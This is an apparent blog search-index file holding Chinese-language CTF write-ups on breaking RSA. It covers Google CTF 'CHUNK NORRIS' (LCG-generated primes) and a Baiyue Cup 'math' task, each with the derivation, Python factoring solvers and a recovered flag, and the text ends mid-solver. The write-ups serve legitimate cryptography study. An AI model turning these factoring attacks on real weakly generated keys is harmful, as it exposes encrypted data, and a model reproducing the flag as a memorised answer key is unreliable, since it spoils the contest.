<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于RSA素数生成漏洞的CTF题</title>
    <url>/posts/6bf2a5bf/</url>
    <content><![CDATA[<h1 id="Google-CTF-–-CHUNK-NORRIS"><a href="#Google-CTF-–-CHUNK-NORRIS" class="headerlink" title="Google CTF – CHUNK NORRIS"></a>Google CTF – CHUNK NORRIS</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/images/loading.gif" data-original="/posts/6bf2a5bf/image-20200824003337195.png" alt="image-20200824003337195"></p>
<a id="more"></a>
<p>下载附件后是两个文件</p>
<p><img src="/images/loading.gif" data-original="/posts/6bf2a5bf/image-20200824003505866.png" alt="image-20200824003505866"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = <span class="number">0xe64a5f84e2762be5</span></span><br><span class="line">chunk_size = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span><span class="params">(bits)</span>:</span></span><br><span class="line">    s = random.getrandbits(chunk_size)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    	s |= <span class="number">0xc000000000000001</span></span><br><span class="line">    	p = <span class="number">0</span></span><br><span class="line">    	<span class="keyword">for</span> _ <span class="keyword">in</span> range(bits // chunk_size):</span><br><span class="line">      		p = (p &lt;&lt; chunk_size) + s</span><br><span class="line">      		s = a * s % <span class="number">2</span>**chunk_size</span><br><span class="line">    	<span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">      		<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">n = gen_prime(<span class="number">1024</span>) * gen_prime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">flag = open(<span class="string">"flag.txt"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line">print(<span class="string">'n ='</span>, hex(n))</span><br><span class="line">print(<span class="string">'e ='</span>, hex(e))</span><br><span class="line">print(<span class="string">'c ='</span>, hex(pow(bytes_to_long(flag), e, n)))</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19</span><br><span class="line">e &#x3D; 0x10001</span><br><span class="line">c &#x3D; 0x6a12d56e26e460f456102c83c68b5cf355b2e57d5b176b32658d07619ce8e542d927bbea12fb8f90d7a1922fe68077af0f3794bfd26e7d560031c7c9238198685ad9ef1ac1966da39936b33c7bb00bdb13bec27b23f87028e99fdea0fbee4df721fd487d491e9d3087e986a79106f9d6f5431522270200c5d545d19df446dee6baa3051be6332ad7e4e6f44260b1594ec8a588c0450bcc8f23abb0121bcabf7551fd0ec11cd61c55ea89ae5d9bcc91f46b39d84f808562a42bb87a8854373b234e71fe6688021672c271c22aad0887304f7dd2b5f77136271a571591c48f438e6f1c08ed65d0088da562e0d8ae2dadd1234e72a40141429f5746d2d41452d916</span><br></pre></td></tr></table></figure></div>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>通过分析线性同余方法生成的随机质数，找到分解n的方法:</p>
<p>首先研究pq的生成，可知</p>
<script type="math/tex; mode=display">
\begin{align}
B &= 2 ^ {64}\\
p &= s_1 << 960 + (s_1 * a \% B) << 896 + (s_1 * a^2 \% B) << 832 + ... + (s_1 * a^{14} \% B) << 64 + (s_1 * a^{15} \% B)\\
  &= s_1 << 960 + k_1 << 64 + (s_1 * a^{15} \% B)\\
q &= s_2 << 960 + (s_2 * a \% B) << 896 + (s_2 * a^2 \% B) << 832 + ... + (s_2 * a^{14} \% B) << 64 + (s_2 * a^{15} \% B)\\
  &= s_2 << 960 + k_2 << 64 + (s_2 * a^{15} \% B)\\
pq &= p * q\\
   &= (s_1 << 960 + k_1 << 64 + (s_1 * a^{15} \% B))*(s_2 << 960 + k_2 << 64 + (s_2 * a^{15} \% B))\\
   &= s_1s_2 << 1920 + s_1k_2 << 64 + (s_2 * a^{15} \% B)s_1 << 960 + k_1s_2 << 1024 + k_1k_2 << 128  \\
   &+ (s_2 * a^{15} \% B)k_1 << 64 + (s_1 * a^{15} \% B)s_2 << 960 + (s_1 * a^{15} \% B)k_2 << 64 + (s_1 * a^{15} \% B)(s_2 * a^{15} \% B)\\
\end{align}</script><p>去掉不重叠的位数部分</p>
<p>可知 $s_1s_2$等于pq的高64位或者其减一（由于进位），$s_1s_2*a^{30}\%B$等于低64位</p>
<p>因此可计算出$s_1s_2$的值，分别考虑进位和不进位，可计算出两个值</p>
<p>得到$s_1s_2$的两个乘积，接下来用yafu分别进行质因数分解</p>
<p>已知<code>s |= 0xc000000000000001</code>可知<code>s &amp; 0xc000000000000001 != 0</code>，由于分解后的质因数太多，产生的因数也太多，无法马上确定哪个因数和s匹配，我们利用质因数集生成其所有子集，再借用上式条件和p为质数的条件找到正确的s1和s2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x6a12d56e26e460f456102c83c68b5cf355b2e57d5b176b32658d07619ce8e542d927bbea12fb8f90d7a1922fe68077af0f3794bfd26e7d560031c7c9238198685ad9ef1ac1966da39936b33c7bb00bdb13bec27b23f87028e99fdea0fbee4df721fd487d491e9d3087e986a79106f9d6f5431522270200c5d545d19df446dee6baa3051be6332ad7e4e6f44260b1594ec8a588c0450bcc8f23abb0121bcabf7551fd0ec11cd61c55ea89ae5d9bcc91f46b39d84f808562a42bb87a8854373b234e71fe6688021672c271c22aad0887304f7dd2b5f77136271a571591c48f438e6f1c08ed65d0088da562e0d8ae2dadd1234e72a40141429f5746d2d41452d916</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0xe64a5f84e2762be5</span></span><br><span class="line">chunk_size = <span class="number">64</span></span><br><span class="line">bits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">n1 = mpz(int(<span class="string">'0b'</span>+bin(n)[<span class="number">2</span>:<span class="number">66</span>],<span class="number">2</span>))</span><br><span class="line">n2_star = mpz(int(<span class="string">'0b'</span>+(bin(n)[<span class="number">-64</span>:]),<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">n2 = n2_star*invert(pow(a,<span class="number">15</span>+<span class="number">15</span>),<span class="number">2</span>**<span class="number">64</span>)%(<span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s12_1 = (n1&lt;&lt;<span class="number">64</span>)+n2</span><br><span class="line">s12_2 = (n1&lt;&lt;<span class="number">64</span>)+n2-(<span class="number">1</span>&lt;&lt;<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0xc000000000000001</span> <span class="comment"># s的下限</span></span><br><span class="line">j = <span class="number">0xffffffffffffffff</span> <span class="comment"># s的上限</span></span><br><span class="line"></span><br><span class="line">print(s12_1)</span><br><span class="line">print(s12_2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu-x64.exe  factor(227963529990382503519930590718284598961)</span></span><br><span class="line"></span><br><span class="line">factors1 = [<span class="number">11</span>, <span class="number">61</span>, <span class="number">443</span> ,<span class="number">21751</span> , <span class="number">1933727</span> , <span class="number">53523187</span> , <span class="number">340661278587863</span>]</span><br><span class="line">factors2 = [<span class="number">3</span>, <span class="number">5</span> , <span class="number">41</span> , <span class="number">43</span> , <span class="number">509</span> , <span class="number">787</span> , <span class="number">31601</span> , <span class="number">258737</span> , <span class="number">28110221</span> , <span class="number">93627982031</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(nums)</span>:</span></span><br><span class="line">    <span class="comment"># 计算子集</span></span><br><span class="line">    res = [[]]</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums: </span><br><span class="line">        res += [ i + [num] <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(nums)</span>:</span></span><br><span class="line">    <span class="comment"># 计算list中所有元素的积</span></span><br><span class="line">    <span class="keyword">if</span> len(nums)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            s *= i</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># 判断s是不是正确的</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(bits // chunk_size):</span><br><span class="line">      	p = (p &lt;&lt; chunk_size) + s</span><br><span class="line">      	s = a * s % <span class="number">2</span>**chunk_size</span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pq</span><span class="params">(nums,s12)</span>:</span></span><br><span class="line">    nums_set=subsets(nums)</span><br><span class="line">    <span class="keyword">for</span> nums <span class="keyword">in</span> nums_set:</span><br><span class="line">        s=mul(nums)</span><br><span class="line">        <span class="keyword">if</span> s&gt;=k <span class="keyword">and</span> s&lt;=j <span class="keyword">and</span> (s12//s)&gt;=k <span class="keyword">and</span> (s12//s)&lt;=j:</span><br><span class="line">            <span class="keyword">if</span> (s&amp;<span class="number">0xc000000000000001</span>)!=<span class="number">0</span> <span class="keyword">and</span> ((s12//s)&amp;<span class="number">0xc000000000000001</span>)!=<span class="number">0</span>:</span><br><span class="line">                p = judge(s)</span><br><span class="line">                <span class="keyword">if</span> p!=<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">'factors: '</span>,nums)</span><br><span class="line">                    print(<span class="string">'p ='</span>,p)</span><br><span class="line">                    print(<span class="string">'q ='</span>,n//p)</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">solve_pq(factors1,s12_1)</span><br><span class="line">solve_pq(factors2,s12_2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#factors:  [3, 41, 43, 31601, 93627982031]</span></span><br><span class="line">p = <span class="number">152502124356100186048786584829816790951655306938554698381698516601140428798527485382577251685142660191666259802101357483152615284884054484645840626070726530443669580292854859145584666559430830034877567195195160870921467137859654581026067555226827127667674180022694309303154807908193178891551927991884659577259</span></span><br><span class="line">q = <span class="number">141964956842752227248825926479699850723242530500694299313985420916497490762457584872482228917124059114703818621232802014903763726586933292312009226271853350101621181936884771804789258383198041375410984842224059398802858374416574235073826923494095170442408144974244355981836859001182779710177024561285836339787</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">因此s12=(n1&lt;&lt;64)+n2-(1&lt;&lt;64)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x6a12d56e26e460f456102c83c68b5cf355b2e57d5b176b32658d07619ce8e542d927bbea12fb8f90d7a1922fe68077af0f3794bfd26e7d560031c7c9238198685ad9ef1ac1966da39936b33c7bb00bdb13bec27b23f87028e99fdea0fbee4df721fd487d491e9d3087e986a79106f9d6f5431522270200c5d545d19df446dee6baa3051be6332ad7e4e6f44260b1594ec8a588c0450bcc8f23abb0121bcabf7551fd0ec11cd61c55ea89ae5d9bcc91f46b39d84f808562a42bb87a8854373b234e71fe6688021672c271c22aad0887304f7dd2b5f77136271a571591c48f438e6f1c08ed65d0088da562e0d8ae2dadd1234e72a40141429f5746d2d41452d916</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryto</span><span class="params">(p, q, e, c)</span>:</span></span><br><span class="line">    d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    flag = pow(c,d,n)</span><br><span class="line">    flag = long_to_bytes(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">print(decryto(p, q, e, c))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">CTF&#123;__donald_knuths_lcg_would_be_better_well_i_dont_think_s0__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></div>
<p>另一道类似赛题</p>
<h1 id="百越杯赛题-math"><a href="#百越杯赛题-math" class="headerlink" title="百越杯赛题 - math"></a>百越杯赛题 - math</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flags <span class="keyword">import</span> Flags</span><br><span class="line">flag = s2n(flag)</span><br><span class="line">a = getRandomRange(pow(<span class="number">10</span>,<span class="number">499</span>),pow(<span class="number">10</span>,<span class="number">500</span>))</span><br><span class="line">b = getRandomRange(pow(<span class="number">10</span>,<span class="number">499</span>),pow(<span class="number">10</span>,<span class="number">500</span>))</span><br><span class="line">p = a*pow(<span class="number">10</span>,<span class="number">500</span>)+b</span><br><span class="line">q = b*pow(<span class="number">10</span>,<span class="number">500</span>)+a</span><br><span class="line"><span class="keyword">print</span> p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = getRandomInteger(<span class="number">100</span>)</span><br><span class="line">p = next_prime(p+c)</span><br><span class="line">q = next_prime(q+c)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line">flag = pow(flag,e,n)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></div>
<p>以上代码的输出如下:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span><br><span class="line"></span><br><span class="line">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921</span><br><span class="line"></span><br><span class="line">37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span><br></pre></td></tr></table></figure></div>
<h2 id="Writeup-1"><a href="#Writeup-1" class="headerlink" title="Writeup"></a>Writeup</h2><script type="math/tex; mode=display">
\begin{align}
    p & = a \cdot 10^{500} + b \\
    q & = b \cdot 10^{500} + a \\ 
    p \cdot q & = (a \cdot 10^{500} + b) \cdot (b \cdot 10^{500} + a) \\
    & = ab \cdot 10^{1000} + (a^2+b^2) \cdot 10^{500} +ab\\ 
    & 
   \end{align}</script><p>因为a和b的位数都是500位，由此可知</p>
<p>$ab \cdot 10^{1000}$的有效位数范围为1001~2000</p>
<p>$a^2 \cdot 10^{500}$和$b^2 \cdot 10^{500}$的有效位数范围是501~1500</p>
<p>$ab$的有效位数范围1~500</p>
<p>由此可知</p>
<p>$ab$的前500位等于$p \cdot q$的前500位或其减一</p>
<p>$ab$的后500位等于$p \cdot q$的后500位</p>
<p>$(a^2+b^2)$的前500位+$ab$的后500位等于$p \cdot q$的中间1001~1500位或其加上$10^{1000}$</p>
<p>$(a^2+b^2)$的后500位+$ab$的前500位等于$p \cdot q$的中间501~1000位</p>
<p>根据上述发现可计算出a、b的值,其中利用$(a+b)^2$的值是否为完全平方数判断ab的正确性</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment">#37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span></span><br><span class="line"><span class="comment">#37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921</span></span><br><span class="line"><span class="comment">#37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span></span><br><span class="line">pq = gmpy2.mpz(<span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span>)</span><br><span class="line"><span class="comment">#不存在进位</span></span><br><span class="line">ab_1 = int(str(pq)[:<span class="number">500</span>]+str(pq)[<span class="number">-500</span>:]) </span><br><span class="line"><span class="comment">#存在进位</span></span><br><span class="line">ab_2 = ab_1 - <span class="number">10</span>**<span class="number">500</span> </span><br><span class="line"><span class="comment">#不存在进位</span></span><br><span class="line">a2Tb2_1 = int(str(pq)[<span class="number">500</span>:<span class="number">1500</span>])-int(str(ab_1)[<span class="number">500</span>:<span class="number">1000</span>]+str(ab_1)[<span class="number">0</span>:<span class="number">500</span>])</span><br><span class="line"><span class="comment">#存在进位</span></span><br><span class="line">a2Tb2_2 = int(str(pq)[<span class="number">500</span>:<span class="number">1500</span>])-int(str(ab_2)[<span class="number">500</span>:<span class="number">1000</span>]+str(ab_2)[<span class="number">0</span>:<span class="number">500</span>])+<span class="number">10</span>**<span class="number">1000</span></span><br><span class="line"><span class="comment">#存在进位</span></span><br><span class="line">aTb2_1 = a2Tb2_1+<span class="number">2</span>*ab_1</span><br><span class="line"><span class="comment">#不存在进位</span></span><br><span class="line">aTb2_2 = a2Tb2_2+<span class="number">2</span>*ab_2</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(aTb2_1,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">'不存在进位'</span>)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(aTb2_2,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>:</span><br><span class="line">    